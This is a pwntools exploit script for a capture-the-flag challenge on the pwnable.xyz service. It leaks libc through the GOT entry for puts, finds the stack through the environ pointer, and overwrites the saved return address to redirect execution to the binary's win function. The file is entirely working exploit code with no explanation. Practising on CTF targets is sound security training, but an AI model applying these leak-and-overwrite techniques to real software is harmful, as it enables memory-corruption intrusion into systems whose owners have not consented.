from pwn import *

context.log_level = 'debug'
e = ELF('./challenge')
# p = process('./challenge')
# libc = e.libc
p = remote('svc.pwnable.xyz',30019)
libc = ELF('alpine-libc-2.28.so')
sa = lambda x,y : p.sendafter(x,y)
sla = lambda x,y : p.sendlineafter(x,y)
win = e.symbols['win']
main = e.symbols['main']

sla('>','1')
sa(':',str(e.got['puts']))
puts = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
log.info('puts : {}'.format(hex(puts)))
libc_base = puts - libc.symbols['puts']
log.info('libc_base : {}'.format(hex(libc_base)))
environ_ptr = libc_base + libc.symbols['environ'] 
log.info('environ_ptr : {}'.format(hex(environ_ptr)))

sla('>','1')
sa(':',str(environ_ptr))
environ = u64(p.recvuntil('\x7f')[-6:]+'\x00\x00')
log.info('environ : {}'.format(hex(environ)))
# environ - rbp = 248
rbp = environ - 248
log.info('rbp : {}'.format(hex(rbp)))
return_add = rbp + 8
log.info('return : {}'.format(hex(return_add)))

sla('>','2')
sa(':',str(return_add))
sa(':',str(win))

sla('>','0')

p.interactive()